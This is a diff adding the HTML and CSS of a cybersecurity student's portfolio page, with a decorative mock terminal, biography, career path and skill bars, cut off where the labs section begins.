@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dumitru Tanasie — Cybersecurity Portfolio</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;500;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #060b14;
+  --bg2: #0a1220;
+  --bg3: #0f1a2e;
+  --panel: #111d32;
+  --border: rgba(0,200,255,0.12);
+  --border2: rgba(0,200,255,0.25);
+  --accent: #00c8ff;
+  --accent2: #0077ff;
+  --accent3: #7b2fff;
+  --green: #00ff9d;
+  --red: #ff4060;
+  --amber: #ffaa00;
+  --text: #e8f0fe;
+  --text2: #8899bb;
+  --text3: #4a5a7a;
+  --mono: 'JetBrains Mono', monospace;
+  --display: 'Syne', sans-serif;
+  --body: 'DM Sans', sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:16px;line-height:1.7;overflow-x:hidden}
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--accent2);border-radius:2px}
+
+/* ── NOISE OVERLAY ── */
+body::before{content:"";position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");pointer-events:none;z-index:1000;opacity:0.4}
+
+/* ── GRID LINES ── */
+body::after{content:"";position:fixed;inset:0;background-image:linear-gradient(rgba(0,200,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,200,255,0.03) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;z-index:0}
+
+/* ── NAV ── */
+nav{position:fixed;top:0;left:0;right:0;z-index:500;padding:0 2rem;height:60px;display:flex;align-items:center;justify-content:space-between;background:rgba(6,11,20,0.85);backdrop-filter:blur(20px);border-bottom:1px solid var(--border)}
+.nav-logo{font-family:var(--mono);font-size:14px;font-weight:700;color:var(--accent);letter-spacing:2px}
+.nav-logo span{color:var(--text2)}
+.nav-links{display:flex;gap:1.5rem;list-style:none}
+.nav-links a{font-family:var(--mono);font-size:12px;color:var(--text2);text-decoration:none;letter-spacing:1px;transition:color 0.2s;text-transform:uppercase}
+.nav-links a:hover,.nav-links a.active{color:var(--accent)}
+.nav-status{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--green)}
+.status-dot{width:7px;height:7px;border-radius:50%;background:var(--green);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.8)}}
+.hamburger{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:4px}
+.hamburger span{display:block;width:22px;height:2px;background:var(--text2);transition:all 0.3s}
+
+/* ── HERO ── */
+#hero{position:relative;min-height:100vh;display:flex;align-items:center;padding:80px 2rem 2rem;overflow:hidden}
+.hero-grid{display:grid;grid-template-columns:1fr 1fr;gap:4rem;align-items:center;max-width:1200px;margin:0 auto;width:100%;position:relative;z-index:2}
+.hero-eyebrow{font-family:var(--mono);font-size:12px;color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:1rem;display:flex;align-items:center;gap:10px}
+.hero-eyebrow::before{content:"";display:inline-block;width:30px;height:1px;background:var(--accent)}
+h1.hero-name{font-family:var(--display);font-size:clamp(2.5rem,5vw,4.5rem);font-weight:800;line-height:1.05;letter-spacing:-1px;margin-bottom:0.5rem}
+h1.hero-name .first{color:var(--text)}
+h1.hero-name .last{color:var(--accent)}
+.hero-title{font-family:var(--mono);font-size:13px;color:var(--text2);letter-spacing:2px;margin-bottom:1.5rem;text-transform:uppercase}
+.hero-desc{font-size:16px;color:var(--text2);line-height:1.8;margin-bottom:2rem;max-width:480px}
+.hero-desc strong{color:var(--text)}
+.hero-cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn-primary{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;background:var(--accent);color:var(--bg);font-family:var(--mono);font-size:13px;font-weight:700;letter-spacing:1px;text-decoration:none;border-radius:4px;transition:all 0.2s;border:none;cursor:pointer}
+.btn-primary:hover{background:var(--accent2);color:#fff;transform:translateY(-2px)}
+.btn-outline{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;background:transparent;color:var(--accent);font-family:var(--mono);font-size:13px;font-weight:500;letter-spacing:1px;text-decoration:none;border-radius:4px;border:1px solid var(--border2);transition:all 0.2s;cursor:pointer}
+.btn-outline:hover{background:rgba(0,200,255,0.08);transform:translateY(-2px)}
+.hero-visual{position:relative}
+.terminal{background:var(--bg2);border:1px solid var(--border2);border-radius:8px;overflow:hidden;font-family:var(--mono)}
+.terminal-bar{background:var(--bg3);padding:10px 16px;display:flex;align-items:center;gap:8px}
+.t-dot{width:10px;height:10px;border-radius:50%}
+.t-dot.r{background:#ff5f57}.t-dot.y{background:#ffbd2e}.t-dot.g{background:#28ca41}
+.terminal-title{font-size:11px;color:var(--text3);margin-left:auto}
+.terminal-body{padding:1.5rem;font-size:13px;line-height:2}
+.t-prompt{color:var(--accent)}.t-cmd{color:var(--text)}.t-out{color:var(--text2)}.t-green{color:var(--green)}.t-red{color:var(--red)}.t-amber{color:var(--amber)}.t-comment{color:var(--text3)}
+.cursor{display:inline-block;width:8px;height:14px;background:var(--accent);animation:blink 1s infinite;vertical-align:middle}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.floating-badges{display:flex;flex-wrap:wrap;gap:6px;margin-top:1.5rem}
+
+/* ── SECTIONS ── */
+section{padding:80px 2rem;position:relative;z-index:2}
+.container{max-width:1200px;margin:0 auto}
+.section-header{margin-bottom:3rem}
+.section-label{font-family:var(--mono);font-size:11px;color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:0.75rem;display:flex;align-items:center;gap:10px}
+.section-label::before{content:"";display:inline-block;width:20px;height:1px;background:var(--accent)}
+.section-title{font-family:var(--display);font-size:clamp(1.8rem,3vw,2.8rem);font-weight:800;color:var(--text);line-height:1.1}
+.section-title span{color:var(--accent)}
+
+/* ── STATS BAR ── */
+.stats-bar{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:5rem}
+.stat-item{background:var(--bg2);padding:1.5rem;text-align:center}
+.stat-num{font-family:var(--display);font-size:2.5rem;font-weight:800;color:var(--accent);line-height:1}
+.stat-label{font-family:var(--mono);font-size:11px;color:var(--text3);letter-spacing:2px;margin-top:4px;text-transform:uppercase}
+
+/* ── SKILL BARS ── */
+.skill-category{margin-bottom:2.5rem}
+.skill-cat-title{font-family:var(--mono);font-size:12px;color:var(--accent2);letter-spacing:2px;text-transform:uppercase;margin-bottom:1rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border)}
+.skill-item{margin-bottom:12px}
+.skill-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:4px}
+.skill-name{font-size:13px;color:var(--text);font-weight:500}
+.skill-pct{font-family:var(--mono);font-size:11px;color:var(--text2)}
+.skill-bar{height:4px;background:var(--bg3);border-radius:2px;overflow:hidden}
+.skill-fill{height:100%;border-radius:2px;transition:width 1.2s cubic-bezier(0.4,0,0.2,1);width:0}
+.skill-tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:0.75rem}
+.stag{font-family:var(--mono);font-size:11px;padding:3px 10px;border-radius:3px;border:1px solid var(--border);color:var(--text2);background:var(--bg3)}
+
+/* ── LAB CARDS ── */
+.labs-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1.5rem}
+.lab-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;overflow:hidden;transition:border-color 0.3s,transform 0.3s;cursor:pointer}
+.lab-card:hover{border-color:var(--border2);transform:translateY(-4px)}
+.lab-card-header{padding:1.25rem 1.5rem;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:flex-start}
+.lab-card-title{font-family:var(--display);font-size:15px;font-weight:700;color:var(--text);margin-bottom:3px}
+.lab-card-sub{font-family:var(--mono);font-size:11px;color:var(--text3)}
+.lab-badge{font-family:var(--mono);font-size:10px;padding:3px 10px;border-radius:20px;white-space:nowrap}
+.lb-off{background:rgba(255,64,96,0.1);color:var(--red);border:1px solid rgba(255,64,96,0.3)}
+.lb-def{background:rgba(0,119,255,0.1);color:var(--accent2);border:1px solid rgba(0,119,255,0.3)}
+.lb-for{background:rgba(123,47,255,0.1);color:var(--accent3);border:1px solid rgba(123,47,255,0.3)}
+.lb-real{background:rgba(255,170,0,0.1);color:var(--amber);border:1px solid rgba(255,170,0,0.3)}
+.lb-net{background:rgba(0,255,157,0.1);color:var(--green);border:1px solid rgba(0,255,157,0.3)}
+.lab-card-body{padding:1.25rem 1.5rem}
+.lab-card-desc{font-size:13px;color:var(--text2);line-height:1.7;margin-bottom:1rem}
+.lab-progress{margin-bottom:1rem}
+.lab-progress-bar{height:3px;background:var(--bg3);border-radius:2px;overflow:hidden;margin-top:4px}
+.lab-progress-fill{height:100%;border-radius:2px}
+.lab-tools{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:1rem}
+.lab-tool{font-family:var(--mono);font-size:10px;padding:2px 8px;background:var(--bg3);border:1px solid var(--border);border-radius:3px;color:var(--text3)}
+.lab-code-toggle{font-family:var(--mono);font-size:11px;color:var(--accent2);cursor:pointer;border:none;background:none;padding:0;display:flex;align-items:center;gap:6px}
+.lab-code{display:none;margin-top:0.75rem;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:1rem;font-family:var(--mono);font-size:11px;color:var(--text2);line-height:1.8;overflow-x:auto}
+.lab-code.open{display:block}
+.code-accent{color:var(--accent)}.code-green{color:var(--green)}.code-amber{color:var(--amber)}.code-red{color:var(--red)}.code-comment{color:var(--text3)}
+
+/* ── WRITEUP ── */
+.writeup-list{display:flex;flex-direction:column;gap:1px;background:var(--border);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.writeup-item{background:var(--bg2);cursor:pointer;transition:background 0.2s}
+.writeup-item:hover{background:var(--bg3)}
+.writeup-header{padding:1.25rem 1.5rem;display:flex;align-items:center;gap:1rem}
+.writeup-num{font-family:var(--mono);font-size:11px;color:var(--text3);width:30px}
+.writeup-title{font-size:14px;font-weight:500;color:var(--text);flex:1}
+.writeup-tags{display:flex;gap:6px}
+.writeup-arrow{font-family:var(--mono);font-size:12px;color:var(--text3);transition:transform 0.3s}
+.writeup-item.open .writeup-arrow{transform:rotate(90deg);color:var(--accent)}
+.writeup-body{display:none;padding:0 1.5rem 1.5rem;border-top:1px solid var(--border)}
+.writeup-item.open .writeup-body{display:block}
+.writeup-section{margin-top:1rem}
+.ws-label{font-family:var(--mono);font-size:10px;color:var(--accent);text-transform:uppercase;letter-spacing:2px;margin-bottom:6px}
+.ws-text{font-size:13px;color:var(--text2);line-height:1.8}
+.code-block{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:1rem;font-family:var(--mono);font-size:11px;color:var(--text2);line-height:1.8;overflow-x:auto;margin-top:8px}
+
+/* ── TIMELINE ── */
+.timeline{position:relative;padding-left:2rem}
+.timeline::before{content:"";position:absolute;left:0;top:8px;bottom:8px;width:1px;background:linear-gradient(to bottom,transparent,var(--accent2) 10%,var(--accent2) 90%,transparent)}
+.tl-item{position:relative;margin-bottom:2.5rem;padding-left:1.5rem}
+.tl-dot{position:absolute;left:-2rem;top:6px;width:12px;height:12px;border-radius:50%;background:var(--bg);border:2px solid var(--accent2);transition:border-color 0.3s}
+.tl-item:hover .tl-dot{border-color:var(--accent);background:var(--accent)}
+.tl-date{font-family:var(--mono);font-size:11px;color:var(--accent2);letter-spacing:1px;margin-bottom:4px}
+.tl-title{font-family:var(--display);font-size:16px;font-weight:700;color:var(--text);margin-bottom:4px}
+.tl-company{font-family:var(--mono);font-size:12px;color:var(--text3);margin-bottom:8px}
+.tl-desc{font-size:13px;color:var(--text2);line-height:1.7}
+.tl-tags{display:flex;flex-wrap:wrap;gap:4px;margin-top:8px}
+
+/* ── CERT GRID ── */
+.cert-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1rem}
+.cert-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.25rem;display:flex;gap:1rem;align-items:flex-start;transition:border-color 0.3s}
+.cert-card:hover{border-color:var(--border2)}
+.cert-icon{width:40px;height:40px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:14px;font-weight:700;flex-shrink:0}
+.cert-name{font-size:14px;font-weight:500;color:var(--text);margin-bottom:2px}
+.cert-issuer{font-family:var(--mono);font-size:11px;color:var(--text3)}
+.cert-status{font-family:var(--mono);font-size:10px;margin-top:4px}
+.cs-active{color:var(--green)}.cs-progress{color:var(--amber)}.cs-planned{color:var(--text3)}
+
+/* ── CONTACT ── */
+.contact-grid{display:grid;grid-template-columns:1fr 1fr;gap:3rem}
+.contact-info{display:flex;flex-direction:column;gap:1rem}
+.contact-row{display:flex;gap:1rem;align-items:center;padding:1rem;background:var(--bg2);border:1px solid var(--border);border-radius:6px}
+.contact-icon{width:36px;height:36px;border-radius:6px;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
+.contact-label{font-family:var(--mono);font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:1px}
+.contact-value{font-size:14px;color:var(--text);margin-top:1px}
+.availability-card{background:var(--bg2);border:1px solid var(--border2);border-radius:8px;padding:1.5rem}
+.avail-title{font-family:var(--display);font-size:18px;font-weight:700;color:var(--text);margin-bottom:1rem}
+.avail-item{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:13px;color:var(--text2)}
+.avail-dot{width:6px;height:6px;border-radius:50%}
+.ad-green{background:var(--green)}.ad-amber{background:var(--amber)}.ad-blue{background:var(--accent)}
+
+/* ── FOOTER ── */
+footer{padding:2rem;border-top:1px solid var(--border);text-align:center}
+.footer-text{font-family:var(--mono);font-size:11px;color:var(--text3);letter-spacing:1px}
+.footer-text span{color:var(--accent)}
+
+/* ── FADE IN ── */
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity 0.6s ease,transform 0.6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+
+/* ── RESPONSIVE ── */
+@media(max-width:900px){
+  .hero-grid{grid-template-columns:1fr;gap:2rem}
+  .hero-visual{order:-1}
+  .stats-bar{grid-template-columns:repeat(2,1fr)}
+  .contact-grid{grid-template-columns:1fr}
+  .nav-links{display:none;position:absolute;top:60px;left:0;right:0;background:rgba(6,11,20,0.98);flex-direction:column;padding:1rem 2rem;gap:1rem;border-bottom:1px solid var(--border)}
+  .nav-links.open{display:flex}
+  .hamburger{display:flex}
+  .nav-status{display:none}
+}
+@media(max-width:600px){
+  .labs-grid{grid-template-columns:1fr}
+  .cert-grid{grid-template-columns:1fr}
+  .stats-bar{grid-template-columns:1fr 1fr}
+  section{padding:60px 1rem}
+  nav{padding:0 1rem}
+}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav id="navbar">
+  <div class="nav-logo">DT<span>://</span>security</div>
+  <ul class="nav-links" id="navlinks">
+    <li><a href="#hero" class="active">home</a></li>
+    <li><a href="#about">about</a></li>
+    <li><a href="#skills">skills</a></li>
+    <li><a href="#labs">labs</a></li>
+    <li><a href="#writeups">write-ups</a></li>
+    <li><a href="#experience">experience</a></li>
+    <li><a href="#certs">certs</a></li>
+    <li><a href="#contact">contact</a></li>
+  </ul>
+  <div class="nav-status">
+    <div class="status-dot"></div>
+    open to opportunities
+  </div>
+  <div class="hamburger" id="hamburger" onclick="toggleNav()">
+    <span></span><span></span><span></span>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section id="hero">
+  <div class="hero-grid container">
+    <div class="hero-content fade-in">
+      <div class="hero-eyebrow">cybersecurity professional</div>
+      <h1 class="hero-name">
+        <span class="first">Dumitru</span><br>
+        <span class="last">Tanasie</span>
+      </h1>
+      <div class="hero-title">Penetration Tester &nbsp;·&nbsp; SOC Analyst &nbsp;·&nbsp; Data Analyst &nbsp;·&nbsp; IT Support</div>
+      <p class="hero-desc">
+        BSc Cyber Security &amp; Networking candidate at <strong>London Metropolitan University</strong> (graduating 2026). Hands-on across offensive security, threat modelling, digital forensics, SIEM and infrastructure. Building toward <strong>OSCP</strong>.
+      </p>
+      <div class="hero-cta">
+        <a href="#labs" class="btn-primary">View Labs &amp; Projects</a>
+        <a href="#contact" class="btn-outline">Get In Touch</a>
+      </div>
+      <div class="floating-badges" style="margin-top:1.5rem">
+        <span class="stag">Kali Linux</span>
+        <span class="stag">Metasploit</span>
+        <span class="stag">Burp Suite</span>
+        <span class="stag">Splunk</span>
+        <span class="stag">Volatility</span>
+        <span class="stag">Docker</span>
+        <span class="stag">Python</span>
+        <span class="stag">ISO/SAE 21434</span>
+        <span class="stag">HTB Active</span>
+      </div>
+    </div>
+    <div class="hero-visual fade-in" style="animation-delay:0.2s">
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="t-dot r"></div>
+          <div class="t-dot y"></div>
+          <div class="t-dot g"></div>
+          <span class="terminal-title">dumitru@kali:~$</span>
+        </div>
+        <div class="terminal-body" id="termout">
+          <div><span class="t-prompt">┌──(dumitru㉿kali)-[~]</span></div>
+          <div><span class="t-prompt">└─$</span> <span class="t-cmd">whoami</span></div>
+          <div class="t-green">dumitru-tanasie</div>
+          <div style="margin-top:8px"><span class="t-prompt">└─$</span> <span class="t-cmd">cat profile.txt</span></div>
+          <div class="t-out">Role    : Junior Pentester / SOC Analyst</div>
+          <div class="t-out">Location: Coventry, UK</div>
+          <div class="t-out">Degree  : BSc Cyber Security (2026)</div>
+          <div class="t-out">Status  : <span class="t-green">OPEN TO OPPORTUNITIES</span></div>
+          <div style="margin-top:8px"><span class="t-prompt">└─$</span> <span class="t-cmd">nmap -sV targets.txt</span></div>
+          <div class="t-amber">Starting Nmap 7.94 at 2026-03-18</div>
+          <div class="t-out">PORT    STATE  SERVICE  VERSION</div>
+          <div class="t-out">22/tcp  open   ssh      OpenSSH 8.9</div>
+          <div class="t-out">80/tcp  open   http     Apache 2.4.49</div>
+          <div class="t-red">CVE-2021-41773 DETECTED !</div>
+          <div style="margin-top:8px"><span class="t-prompt">└─$</span> <span class="t-cmd">msfconsole -q</span></div>
+          <div class="t-green">msf6 &gt; _<span class="cursor"></span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- STATS -->
+<section id="about" style="padding-top:0;padding-bottom:40px">
+  <div class="container">
+    <div class="stats-bar fade-in">
+      <div class="stat-item"><div class="stat-num">8+</div><div class="stat-label">Years Experience</div></div>
+      <div class="stat-item"><div class="stat-num">6</div><div class="stat-label">Labs Built</div></div>
+      <div class="stat-item"><div class="stat-num">15+</div><div class="stat-label">CTF Machines</div></div>
+      <div class="stat-item"><div class="stat-num">3</div><div class="stat-label">Real Engagements</div></div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:start" class="fade-in">
+      <div>
+        <div class="section-label">about me</div>
+        <h2 class="section-title" style="margin-bottom:1.5rem">Junior offensive security<br><span>practitioner</span></h2>
+        <p style="color:var(--text2);line-height:1.9;margin-bottom:1rem;font-size:15px">
+          I'm a cybersecurity professional combining <strong style="color:var(--text)">academic rigour</strong> with real-world experience across penetration testing, SIEM operations, digital forensics and IT infrastructure. I hold an active <strong style="color:var(--accent)">SIA Security Licence</strong>, a <strong style="color:var(--accent)">CRISC certification</strong>, and AWS SAA-C03, with a BSc in Cyber Security &amp; Networking due to complete in 2026.
+        </p>
+        <p style="color:var(--text2);line-height:1.9;margin-bottom:1.5rem;font-size:15px">
+          My background spans real automotive cybersecurity work at <strong style="color:var(--text)">ARDUN Technologies</strong> (ISO/SAE 21434 TARA), legal cyber incident advisory at <strong style="color:var(--text)">Clifford Chance</strong>, founding my own Cyber Essentials toolkit (<strong style="color:var(--accent)">Tanasiom Aegis</strong>), and active participation in HTB and TryHackMe CTF challenges. I'm an IET member and active on HackerOne.
+        </p>
+        <p style="color:var(--text2);line-height:1.9;font-size:15px">
+          My trajectory is clear: <strong style="color:var(--text)">penetration testing</strong>. Every lab I build, every machine I root, and every certification I earn is a deliberate step toward OSCP and a career as a professional penetration tester.
+        </p>
+      </div>
+      <div>
+        <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.5rem">
+          <div style="font-family:var(--mono);font-size:11px;color:var(--accent);letter-spacing:2px;text-transform:uppercase;margin-bottom:1rem">Quick stats</div>
+          <div style="display:flex;flex-direction:column;gap:10px">
+            <div style="display:flex;justify-content:space-between;padding-bottom:10px;border-bottom:1px solid var(--border);font-size:13px"><span style="color:var(--text2)">Degree</span><span style="color:var(--text);font-weight:500">BSc Cyber Security & Networking</span></div>
+            <div style="display:flex;justify-content:space-between;padding-bottom:10px;border-bottom:1px solid var(--border);font-size:13px"><span style="color:var(--text2)">University</span><span style="color:var(--text)">London Metropolitan (2026)</span></div>
+            <div style="display:flex;justify-content:space-between;padding-bottom:10px;border-bottom:1px solid var(--border);font-size:13px"><span style="color:var(--text2)">Location</span><span style="color:var(--text)">Coventry, UK</span></div>
+            <div style="display:flex;justify-content:space-between;padding-bottom:10px;border-bottom:1px solid var(--border);font-size:13px"><span style="color:var(--text2)">Memberships</span><span style="color:var(--accent)">IET · HackerOne · HTB · THM</span></div>
+            <div style="display:flex;justify-content:space-between;padding-bottom:10px;border-bottom:1px solid var(--border);font-size:13px"><span style="color:var(--text2)">Languages</span><span style="color:var(--text)">English C2 · Romanian native</span></div>
+            <div style="display:flex;justify-content:space-between;font-size:13px"><span style="color:var(--text2)">Target cert</span><span style="color:var(--green)">OSCP (12 month goal)</span></div>
+          </div>
+        </div>
+
+        <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.5rem;margin-top:1rem">
+          <div style="font-family:var(--mono);font-size:11px;color:var(--accent);letter-spacing:2px;text-transform:uppercase;margin-bottom:1rem">Career path</div>
+          <div style="display:flex;align-items:center;gap:0;flex-wrap:wrap;gap:4px">
+            <div style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:6px 12px;font-size:12px;text-align:center"><div style="font-family:var(--mono);font-size:10px;color:var(--accent2)">NOW</div><div style="color:var(--text);font-size:12px;font-weight:500">SOC L1 / IT Support</div><div style="color:var(--text3);font-size:11px">£28–35k</div></div>
+            <div style="color:var(--accent);font-family:var(--mono);padding:0 4px">→</div>
+            <div style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:6px 12px;font-size:12px;text-align:center"><div style="font-family:var(--mono);font-size:10px;color:var(--amber)">YEAR 1</div><div style="color:var(--text);font-size:12px;font-weight:500">Junior Pentester</div><div style="color:var(--text3);font-size:11px">£35–45k</div></div>
+            <div style="color:var(--accent);font-family:var(--mono);padding:0 4px">→</div>
+            <div style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:6px 12px;font-size:12px;text-align:center"><div style="font-family:var(--mono);font-size:10px;color:var(--green)">OSCP</div><div style="color:var(--text);font-size:12px;font-weight:500">Pen Tester</div><div style="color:var(--text3);font-size:11px">£50–65k</div></div>
+            <div style="color:var(--accent);font-family:var(--mono);padding:0 4px">→</div>
+            <div style="background:rgba(0,200,255,0.08);border:1px solid var(--border2);border-radius:4px;padding:6px 12px;font-size:12px;text-align:center"><div style="font-family:var(--mono);font-size:10px;color:var(--accent)">TARGET</div><div style="color:var(--accent);font-size:12px;font-weight:500">Red Team Lead</div><div style="color:var(--text3);font-size:11px">£70k+</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SKILLS -->
+<section id="skills" style="background:var(--bg2)">
+  <div class="container">
+    <div class="section-header fade-in">
+      <div class="section-label">technical proficiency</div>
+      <h2 class="section-title">Skills &amp; <span>Arsenal</span></h2>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:3rem" class="fade-in">
+      <div>
+        <div class="skill-category">
+          <div class="skill-cat-title">// offensive security</div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Kali Linux</span><span class="skill-pct">88%</span></div><div class="skill-bar"><div class="skill-fill" style="width:88%;background:var(--red)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Metasploit Framework</span><span class="skill-pct">75%</span></div><div class="skill-bar"><div class="skill-fill" style="width:75%;background:var(--red)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Burp Suite</span><span class="skill-pct">72%</span></div><div class="skill-bar"><div class="skill-fill" style="width:72%;background:var(--red)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Nmap / Nessus</span><span class="skill-pct">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%;background:var(--red)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">OWASP Top 10 / Web App Testing</span><span class="skill-pct">70%</span></div><div class="skill-bar"><div class="skill-fill" style="width:70%;background:var(--red)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Privilege Escalation (Linux/Win)</span><span class="skill-pct">68%</span></div><div class="skill-bar"><div class="skill-fill" style="width:68%;background:var(--red)"></div></div></div>
+        </div>
+        <div class="skill-category">
+          <div class="skill-cat-title">// programming &amp; scripting</div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Python</span><span class="skill-pct">75%</span></div><div class="skill-bar"><div class="skill-fill" style="width:75%;background:var(--accent2)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Bash / Shell</span><span class="skill-pct">70%</span></div><div class="skill-bar"><div class="skill-fill" style="width:70%;background:var(--accent2)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">PowerShell</span><span class="skill-pct">65%</span></div><div class="skill-bar"><div class="skill-fill" style="width:65%;background:var(--accent2)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">SQL</span><span class="skill-pct">62%</span></div><div class="skill-bar"><div class="skill-fill" style="width:62%;background:var(--accent2)"></div></div></div>
+        </div>
+      </div>
+      <div>
+        <div class="skill-category">
+          <div class="skill-cat-title">// defensive &amp; DFIR</div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Splunk SIEM</span><span class="skill-pct">72%</span></div><div class="skill-bar"><div class="skill-fill" style="width:72%;background:var(--accent3)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Autopsy / FTK Imager</span><span class="skill-pct">68%</span></div><div class="skill-bar"><div class="skill-fill" style="width:68%;background:var(--accent3)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Volatility (Memory Forensics)</span><span class="skill-pct">65%</span></div><div class="skill-bar"><div class="skill-fill" style="width:65%;background:var(--accent3)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Wireshark / PCAP Analysis</span><span class="skill-pct">78%</span></div><div class="skill-bar"><div class="skill-fill" style="width:78%;background:var(--accent3)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Incident Response</span><span class="skill-pct">70%</span></div><div class="skill-bar"><div class="skill-fill" style="width:70%;background:var(--accent3)"></div></div></div>
+        </div>
+        <div class="skill-category">
+          <div class="skill-cat-title">// infrastructure &amp; cloud</div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Active Directory</span><span class="skill-pct">80%</span></div><div class="skill-bar"><div class="skill-fill" style="width:80%;background:var(--green)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Docker / Kubernetes</span><span class="skill-pct">72%</span></div><div class="skill-bar"><div class="skill-fill" style="width:72%;background:var(--green)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">AWS Security (SAA-C03)</span><span class="skill-pct">70%</span></div><div class="skill-bar"><div class="skill-fill" style="width:70%;background:var(--green)"></div></div></div>
+          <div class="skill-item"><div class="skill-top"><span class="skill-name">Cisco Networking (CCNA modules)</span><span class="skill-pct">68%</span></div><div class="skill-bar"><div class="skill-fill" style="width:68%;background:var(--green)"></div></div></div>
+        </div>
+      </div>
+    </div>
+    <div class="skill-tags fade-in" style="margin-top:2rem">
+      <span class="stag">BloodHound</span><span class="stag">Cobalt Strike awareness</span><span class="stag">OSINT</span><span class="stag">SQLi</span><span class="stag">XSS</span><span class="stag">IDOR</span><span class="stag">MITRE ATT&CK</span><span class="stag">NIST CSF</span><span class="stag">ISO 27001</span><span class="stag">GDPR / DPA 2018</span><span class="stag">Cyber Essentials</span><span class="stag">ISO/SAE 21434</span><span class="stag">Office 365</span><span class="stag">Windows Server</span><span class="stag">Linux Admin</span><span class="stag">VPN / Firewall Config</span>
+    </div>
+  </div>
+</section>
+
+<!-- LABS -->
+<section id="labs">
+  <div class="container">
+    <div class="section-header fade-in">
+      <div class="section-label">hands-on work</div>
+      <h2 class="section-title">Labs &amp; <span>Projects</span></h2>
+    </div>
+    <div class="labs-grid fade-in">
+
+      <div class="lab-card">
+        <div class="lab-card-header">
